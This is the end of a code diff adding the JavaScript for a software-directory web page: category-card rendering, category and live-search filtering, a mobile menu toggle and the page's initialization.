+  document.querySelectorAll(".category-card").forEach(btn=>{
+    btn.classList.toggle(
+      "active",
+      btn.dataset.category === selectedCategory
+    );
+  });
+
+}
+
+/*
+=================================================
+GENERATE CATEGORY CARDS
+=================================================
+*/
+
+function drawCategories(){
+
+  const container = document.getElementById("categoryGrid");
+
+  container.innerHTML = categories.map(function(cat){
+
+    const count = software.filter(
+      item=>item.category===cat.name
+    ).length;
+
+    return `
+      <button
+        class="category-card"
+        type="button"
+        data-category="${escapeHTML(cat.name)}"
+      >
+        <span class="emoji">${cat.icon}</span>
+        <strong>${escapeHTML(cat.name)}</strong>
+        <small>${count} Listings</small>
+      </button>
+    `;
+
+  }).join("");
+
+}
+
+/*
+=================================================
+CATEGORY FILTER
+=================================================
+*/
+
+function setCategory(category){
+
+  selectedCategory = category;
+  currentQuery = "";
+
+  document.getElementById("searchInput").value = "";
+
+  drawSoftware();
+
+  document.getElementById("browse").scrollIntoView({
+    behavior:"smooth",
+    block:"start"
+  });
+
+  document.getElementById("navigation").classList.remove("open");
+
+  document.getElementById("menuToggle")
+    .setAttribute("aria-expanded","false");
+
+}
+
+/*
+=================================================
+INITIALIZATION
+=================================================
+*/
+
+drawCategories();
+drawSoftware();
+
+document.getElementById("appCount").textContent = software.length;
+
+document.getElementById("year").textContent =
+  new Date().getFullYear();
+
+/*
+=================================================
+CATEGORY CLICK
+=================================================
+*/
+
+document.querySelectorAll("[data-category]").forEach(function(btn){
+
+  btn.addEventListener("click",function(e){
+
+    e.preventDefault();
+
+    setCategory(btn.dataset.category);
+
+  });
+
+});
+
+/*
+=================================================
+SEARCH
+=================================================
+*/
+
+document.getElementById("searchForm")
+.addEventListener("submit",function(e){
+
+  e.preventDefault();
+
+  selectedCategory = "";
+
+  currentQuery =
+    document.getElementById("searchInput")
+    .value.trim().toLowerCase();
+
+  drawSoftware();
+
+  document.getElementById("browse").scrollIntoView({
+    behavior:"smooth"
+  });
+
+});
+
+/*
+=================================================
+LIVE SEARCH
+=================================================
+*/
+
+document.getElementById("searchInput")
+.addEventListener("input",function(e){
+
+  selectedCategory = "";
+  currentQuery = e.target.value.trim().toLowerCase();
+
+  drawSoftware();
+
+});
+
+/*
+=================================================
+CLEAR FILTER
+=================================================
+*/
+
+document.getElementById("clearFilter")
+.addEventListener("click",function(){
+
+  selectedCategory = "";
+  currentQuery = "";
+
+  document.getElementById("searchInput").value = "";
+
+  drawSoftware();
+
+});
+
+/*
+=================================================
+MOBILE MENU
+=================================================
+*/
+
+document.getElementById("menuToggle")
+.addEventListener("click",function(){
+
+  const nav = document.getElementById("navigation");
+
+  const isOpen = nav.classList.toggle("open");
+
+  this.setAttribute("aria-expanded",String(isOpen));
+
+});
+
+/*
+=================================================
+HOME LINK
+=================================================
+*/
+
+document.getElementById("homeLink")
+.addEventListener("click",function(){
+
+  selectedCategory = "";
+  currentQuery = "";
+
+  document.getElementById("searchInput").value = "";
+
+  drawSoftware();
+
+  document.getElementById("navigation").classList.remove("open");
+
+  document.getElementById("menuToggle")
+    .setAttribute("aria-expanded","false");
+
+});
+
+</script>
+
+</body>
+</html>
